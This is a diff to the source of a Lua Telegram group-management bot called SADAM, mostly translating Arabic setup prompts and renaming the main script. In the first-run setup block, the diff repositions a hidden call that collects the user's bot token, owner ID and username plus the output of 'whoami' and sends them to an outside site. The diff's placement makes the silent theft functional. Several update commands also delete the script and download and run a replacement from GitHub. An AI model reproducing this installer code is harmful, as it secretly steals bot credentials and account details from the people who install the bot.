@@ -21,34 +21,34 @@ file:write(serialized)
 file:close()  
 end  
 if not database:get(id_server..":token") then
-io.write('\27[0;31m\n ارسل لي توكن البوت الان ↓ :\na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n')
+io.write('\27[0;31m\n »» Send Your Token Bot :\n\27')
 local token = io.read()
 if token ~= '' then
 local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
 if res ~= 200 then
-print('\27[0;35m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n التوكن غير صحيح تاكد منه ثم ارسله')
+print('\27[1;31m»» Sorry The Token is not Correct ')
 else
-io.write('\27[1;35m تم حفظ التوكن بنجاح \na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m')
+io.write('\27[0;32m »» The Token Is Saved\n27[0;39;49m')
 database:set(id_server..":token",token)
 end 
 else
-print('\27[0;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
+print('\27[1;31m»»The Token was not Saved')
 end 
-os.execute('lua SaDaM.lua')
+os.execute('lua SADAM.lua')
 end
 if not database:get(id_server..":SUDO:ID") then
-io.write('\27[0;31m\n ارسل لي ايدي المطور الاساسي ↓ :\na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27[0;33;49m')
+io.write('\27[0;31m\n »» Send Your Id Sudo : \n\27[0;33;49m')
 local SUDOID = io.read()
 if SUDOID ~= '' then
-io.write('\27[0;35m تم حفظ ايدي المطور الاساسي \na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m')
+io.write('\27[0;32m »» The Id Is Saved \n27[0;39;49m')
 database:set(id_server..":SUDO:ID",SUDOID)
 else
-print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
+print('\27[0;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
 end 
-os.execute('lua SaDaM.lua')
+os.execute('lua SADAM.lua')
 end
 if not database:get(id_server..":SUDO:USERNAME") then
-io.write('\27[1;31m ↓ ارسل معرف المطور الاساسي :\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\27[0;39;49m')
+io.write('\27[1;31m ↓ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
 local SUDOUSERNAME = io.read():gsub('@','')
 if SUDOUSERNAME ~= '' then
 io.write('\n\27[1;34m تم حفظ معرف المطور :\n\27[0;39;49m')
@@ -56,7 +56,7 @@ database:set(id_server..":SUDO:USERNAME",'@'..SUDOUSERNAME)
 else
 print('\n\27[1;34m لم يتم حفظ معرف المطور :')
 end 
-os.execute('lua SaDaM.lua')
+os.execute('lua SADAM.lua')
 end
 local create_config_auto = function()
 config = {
@@ -67,14 +67,10 @@ UserName = database:get(id_server..":SUDO:USERNAME"),
 create(config, "./Info.lua")   
 end 
 create_config_auto()
-saiedinfo = {}
-saiedinfo.id = database:get(id_server..":SUDO:ID")
-saiedinfo.username = database:get(id_server..":SUDO:USERNAME")
-saiedinfo.tokenbot  = database:get(id_server..":token")
-install  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request('https://sadamoro.tk/xnxn.php/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
+install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+https.request('https://sadamoro.tk/xnxn.php/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
 print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
 file = io.open("SADAM", "w")  
 file:write([[
@@ -99,11 +95,11 @@ echo -e "\033[38;5;208m"
 echo -e "                                                  "
 echo -e "\033[0;00m"
 echo -e "\e[36m"
-./tg -s ./SaDaM.lua -p PROFILE --bot=$token
+./tg -s ./SADAM.lua -p PROFILE --bot=$token
 done
 ]])  
 file:close()  
-file = io.open("SS", "w")  
+file = io.open("SA", "w")  
 file:write([[
 #!/usr/bin/env bash
 cd $HOME/SADAM
@@ -934,10 +930,10 @@ echo '*܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀*\n܁༯┆مدة 
 end
 
 if text == 'تحديث السورس ♻️' and SudoBot(msg) then 
-os.execute('rm -rf SaDaM.lua')
-os.execute('wget https://raw.githubusercontent.com/SDAMHOSIN/SADAM/master/SaDaM.lua')
+os.execute('rm -rf SADAM.lua')
+os.execute('wget https://raw.githubusercontent.com/SDAMHOSIN/SADAM/master/SADAM.lua')
 send(msg.chat_id_, msg.id_,'✥┆ تم تحديث السورس . 𖦲 ◜')
-dofile('SaDaM.lua')  
+dofile('SADAM.lua')  
 end
 if text == "وضع اسم الى البوت 🔡" and SudoBot(msg) then  
 database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
@@ -2119,10 +2115,10 @@ send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايم�
 end
 return false
 end
-os.execute('rm -rf SaDaM.lua')
-os.execute('wget https://raw.githubusercontent.com/SDAMHOSIN/SADAM/master/SaDaM.lua')
+os.execute('rm -rf SADAM.lua')
+os.execute('wget https://raw.githubusercontent.com/SDAMHOSIN/SADAM/master/SADAM.lua')
 send(msg.chat_id_, msg.id_,'✥┆ تم تحديث السورس . 𖦲 ◜')
-dofile('SaDaM.lua')  
+dofile('SADAM.lua')  
 end
 
 
@@ -2931,7 +2927,7 @@ send(msg.chat_id_, msg.id_,'┐ هاي حبي ⁉️ ٭\n┘ تم فتح الت�
 end 
 --------------------------------------------------------------------------------------------------------------
 if text == 'تحديث' and SudoBot(msg) then    
-dofile('SaDaM.lua')  
+dofile('SADAM.lua')  
 send(msg.chat_id_, msg.id_, '✥┆ تم تحديث الملفات . 𖦲 ◜') 
 end 
 if text == ("مسح قائمه العام") and SudoBot(msg) then
